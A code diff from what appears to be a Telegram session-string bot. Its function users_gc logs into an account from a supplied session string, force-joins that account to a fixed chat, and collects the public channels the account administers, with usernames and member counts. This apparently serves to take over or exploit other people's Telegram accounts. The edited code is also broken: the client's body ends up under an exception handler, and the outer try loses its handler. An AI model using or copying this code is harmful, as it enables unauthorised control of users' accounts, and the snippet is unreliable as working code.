@@ -22,20 +22,17 @@ async def users_gc(session):
     try:
         if session.endswith("="):
             try:
-                with TelegramClient(StringSession(session),API_ID,API_HASH) as steve:   
+                async with TelegramClient(StringSession(session),API_ID,API_HASH) as steve:   
             except SESSION_EXPIRED:
                 pass              
-                try:
-                    await steve(join(CHAT))
-                except Exception as e:
-                    print(e)
-                k = await steve(GetAdminedPublicChannelsRequest())            
-                for x in k.chats:                
-                    msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
-                
-            except Exception as E:
-                print(E)
-                                                   
+                    try:
+                        await steve(join(CHAT))
+                    except Exception as e:
+                        print(e)
+                    k = await steve(GetAdminedPublicChannelsRequest())            
+                    for x in k.chats:                
+                        msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
+                 
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
